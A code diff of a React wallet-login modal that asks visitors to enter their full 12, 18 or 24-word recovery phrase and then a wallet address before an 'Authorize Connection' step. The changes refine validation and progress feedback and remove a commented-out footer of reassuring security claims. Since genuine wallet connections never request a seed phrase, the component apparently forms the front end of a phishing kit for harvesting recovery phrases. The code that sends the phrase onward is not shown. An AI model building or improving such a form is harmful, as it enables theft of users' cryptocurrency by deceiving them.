@@ -1,13 +1,34 @@
 import { useState } from 'react';
 import { WALLETS } from '../data/constants';
 
+const VALID_COUNTS = [12, 18, 24];
+
 function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
-  const [step, setStep] = useState('seed'); // 'seed' | 'address'
+  const [step, setStep] = useState('seed');
   const [phrase, setPhrase] = useState('');
   const [address, setAddress] = useState('');
 
   const wordCount = phrase.trim() === '' ? 0 : phrase.trim().split(/\s+/).length;
-  const seedReady = wordCount >= 12;
+
+  // Valid only at exactly 12, 18, or 24
+  const seedReady = VALID_COUNTS.includes(wordCount);
+
+  // Which milestone are we progressing toward?
+  const targetCount = wordCount <= 12 ? 12 : wordCount <= 18 ? 18 : 24;
+  const progressPct = Math.min(100, Math.round((wordCount / targetCount) * 100));
+
+  // Status hint below the badges
+  function getStatus() {
+    if (wordCount === 0) return { text: '', color: 'var(--text3)' };
+    if (seedReady) return { text: `✓ ${wordCount}-word phrase complete`, color: 'var(--accent)' };
+    if (wordCount < 12) return { text: `${12 - wordCount} more word${12 - wordCount !== 1 ? 's' : ''} to reach 12`, color: 'var(--text3)' };
+    if (wordCount > 12 && wordCount < 18) return { text: `${18 - wordCount} more for 18 words · or remove ${wordCount - 12} to use 12`, color: 'var(--orange)' };
+    if (wordCount > 18 && wordCount < 24) return { text: `${24 - wordCount} more for 24 words · or remove ${wordCount - 18} to use 18`, color: 'var(--orange)' };
+    if (wordCount > 24) return { text: 'Too many words — please remove some', color: 'var(--red)' };
+    return { text: '', color: 'var(--text3)' };
+  }
+
+  const status = getStatus();
   const addressReady = address.trim().length >= 10;
 
   const header = (label) => (
@@ -44,38 +65,20 @@ function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
     </div>
   );
 
-  const securityFooter = (
-    <div style={{ padding: '8px 20px 20px' }}>
-      {/* <div style={{
-        display: 'flex', alignItems: 'center', gap: 10, padding: '10px 14px',
-        background: 'var(--surface2)', border: '1px solid var(--border)', borderRadius: 10
-      }}>
-        <div style={{
-          width: 28, height: 28, borderRadius: 8, flexShrink: 0,
-          background: 'var(--surface3)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 14
-        }}>🔐</div>
-        <div>
-          <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 0.8 }}>
-            <span style={{ color: 'var(--text2)' }}>PROTOCOL:</span> BIP-39 Standard Verified
-          </div>
-          <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 0.8 }}>
-            <span style={{ color: 'var(--text2)' }}>SECURITY:</span> Zero-Knowledge Encryption
-          </div>
-        </div>
-      </div> */}
-    </div>
-  );
-
   const actionBtn = (ready, label, onClick) => (
-    <button onClick={onClick} style={{
-      width: '100%', padding: '14px', borderRadius: 12, border: 'none',
-      background: ready ? 'var(--accent)' : 'var(--surface2)',
-      color: ready ? '#000' : 'var(--text3)',
-      fontFamily: "'DM Sans', sans-serif", fontSize: 13, fontWeight: 800,
-      letterSpacing: 1.5, textTransform: 'uppercase',
-      cursor: ready ? 'pointer' : 'not-allowed', transition: 'all 0.2s',
-      boxShadow: ready ? '0 4px 20px rgba(0,255,136,0.25)' : 'none',
-    }}>{label}</button>
+    <button
+      onClick={() => ready && onClick()}
+      disabled={!ready}
+      style={{
+        width: '100%', padding: '14px', borderRadius: 12, border: 'none',
+        background: ready ? 'var(--accent)' : 'var(--surface2)',
+        color: ready ? '#000' : 'var(--text3)',
+        fontFamily: "'DM Sans', sans-serif", fontSize: 13, fontWeight: 800,
+        letterSpacing: 1.5, textTransform: 'uppercase',
+        cursor: ready ? 'pointer' : 'not-allowed', transition: 'all 0.2s',
+        boxShadow: ready ? '0 4px 20px rgba(0,255,136,0.25)' : 'none',
+      }}
+    >{label}</button>
   );
 
   return (
@@ -88,38 +91,105 @@ function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
           <div style={{ padding: '20px 20px 4px' }}>
             {walletBadge}
             <div style={{ fontSize: 10, fontWeight: 700, color: 'var(--text3)', letterSpacing: 2, textTransform: 'uppercase', marginBottom: 8 }}>
-              Enter 12-Word Recovery Phrase
+              Enter Recovery Phrase (12, 18, or 24 words)
             </div>
             <textarea
               autoFocus
-              placeholder="Type or paste your 12,18 or 24 recovery words..."
+              placeholder="word1 word2 word3 ..."
               value={phrase}
               onChange={e => setPhrase(e.target.value)}
               style={{
                 width: '100%', height: 110, background: 'var(--surface2)',
-                border: `1px solid ${seedReady ? 'var(--accent)' : 'var(--border)'}`,
+                border: `1px solid ${seedReady ? 'var(--accent)' : wordCount > 0 ? 'var(--border2)' : 'var(--border)'}`,
                 borderRadius: 12, padding: '12px 14px',
                 fontFamily: "'DM Mono', monospace", fontSize: 13, color: 'var(--text)',
                 outline: 'none', resize: 'none', lineHeight: 1.7, transition: 'border-color 0.2s',
               }}
             />
-            <div style={{ display: 'flex', justifyContent: 'center', margin: '10px 0' }}>
-              <div style={{
-                padding: '4px 14px', borderRadius: 20,
-                background: seedReady ? 'var(--accent-light)' : 'var(--surface2)',
-                border: `1px solid ${seedReady ? 'var(--accent)' : 'var(--border)'}`,
+
+            {/* ── MILESTONE BADGES: 12 / 18 / 24 ── */}
+            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8, margin: '12px 0 4px' }}>
+              {VALID_COUNTS.map(target => {
+                const isPast   = wordCount > target;   // already passed this milestone
+                const isExact  = wordCount === target; // sitting exactly here — valid!
+                const isNext   = !isExact && !isPast && target === targetCount; // currently heading toward this
+
+                return (
+                  <div
+                    key={target}
+                    style={{
+                      padding: '5px 14px', borderRadius: 20,
+                      background: isExact
+                        ? 'var(--accent-light)'
+                        : isPast
+                          ? 'var(--green-bg)'
+                          : 'var(--surface2)',
+                      border: `1px solid ${isExact ? 'var(--accent)' : isPast ? 'var(--green)' : 'var(--border)'}`,
+                      fontSize: 11, fontWeight: 700, letterSpacing: 1,
+                      color: isExact
+                        ? 'var(--accent)'
+                        : isPast
+                          ? 'var(--green)'
+                          : isNext
+                            ? 'var(--text2)'
+                            : 'var(--text3)',
+                      textTransform: 'uppercase', transition: 'all 0.25s',
+                      display: 'flex', alignItems: 'center', gap: 5,
+                    }}
+                  >
+                    {(isPast || isExact) && <span>✓</span>}
+                    {target}" words
+                  </div>
+                );
+              })}
+            </div>
+
+            {/* word count + status hint */}
+            <div style={{ textAlign: 'center', marginBottom: 8 }}>
+              <span style={{
                 fontSize: 11, fontWeight: 700, letterSpacing: 1,
                 color: seedReady ? 'var(--accent)' : 'var(--text3)',
-                textTransform: 'uppercase', transition: 'all 0.2s'
+                fontFamily: "'DM Mono', monospace",
               }}>
-                Words: {wordCount} / 12
-              </div>
+                {wordCount} word{wordCount !== 1 ? 's' : ''} entered
+              </span>
             </div>
+
+            {/* progress bar — only shown when between milestones */}
+            {wordCount > 0 && !seedReady && wordCount <= 24 && (
+              <div style={{ margin: '0 0 8px' }}>
+                <div style={{ height: 4, borderRadius: 2, background: 'var(--surface3)', overflow: 'hidden' }}>
+                  <div style={{
+                    height: '100%', borderRadius: 2,
+                    background: 'linear-gradient(90deg, var(--accent), var(--accent-hover))',
+                    width: `${progressPct}%`, transition: 'width 0.25s ease',
+                  }} />
+                </div>
+                <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 4 }}>
+                  <span style={{ fontSize: 10, color: 'var(--text3)', fontFamily: 'DM Mono' }}>
+                    {status.text}
+                  </span>
+                  <span style={{ fontSize: 10, color: 'var(--text3)', fontFamily: 'DM Mono' }}>
+                    {wordCount} / {targetCount}
+                  </span>
+                </div>
+              </div>
+            )}
+
+            {/* over-24 error */}
+            {wordCount > 24 && (
+              <div style={{
+                textAlign: 'center', fontSize: 11, color: 'var(--red)',
+                fontWeight: 600, marginBottom: 8,
+              }}>
+                {status.text}
+              </div>
+            )}
           </div>
-          <div style={{ padding: '8px 20px' }}>
-            {actionBtn(seedReady, 'Continue →', () => seedReady && setStep('address'))}
+
+          <div style={{ padding: '8px 20px 20px' }}>
+            {actionBtn(seedReady, 'Continue →', () => setStep('address'))}
           </div>
-          {securityFooter}
         </>}
 
         {/* ── STEP 2: WALLET ADDRESS ── */}
@@ -161,7 +231,7 @@ function SeedPhraseModal({ wallet, onClose, onAuthorize }) {
               {actionBtn(addressReady, 'Authorize Connection', () => addressReady && onAuthorize())}
             </div>
           </div>
-          {securityFooter}
+          <div style={{ padding: '8px 20px 20px' }} />
         </>}
 
       </div>
@@ -188,14 +258,10 @@ export default function WalletModal({ title = 'Log in or sign up', onClose, onSe
     <>
       <div className="modal-overlay" onClick={onClose}>
         <div className="modal" onClick={e => e.stopPropagation()}>
-
-          {/* HEADER */}
           <div className="modal-head">
             <div className="modal-title">{title}</div>
             <button className="modal-close" onClick={onClose}>✕</button>
           </div>
-
-          {/* SEARCH */}
           <div className="modal-search">
             <span style={{ color: 'var(--text3)', fontSize: 14 }}>🔍</span>
             <input
@@ -205,8 +271,6 @@ export default function WalletModal({ title = 'Log in or sign up', onClose, onSe
               autoFocus
             />
           </div>
-
-          {/* WALLET LIST */}
           <div className="wallet-list">
             {filtered.map(w => (
               <div
@@ -230,7 +294,6 @@ export default function WalletModal({ title = 'Log in or sign up', onClose, onSe
               </div>
             ))}
           </div>
-
           {showContinue && (
             <div className="modal-footer">
               <button
@@ -245,8 +308,6 @@ export default function WalletModal({ title = 'Log in or sign up', onClose, onSe
           )}
         </div>
       </div>
-
-      {/* BIP-39 → ADDRESS FLOW — locked to the clicked wallet */}
       {seedWallet && (
         <SeedPhraseModal
           wallet={seedWallet}
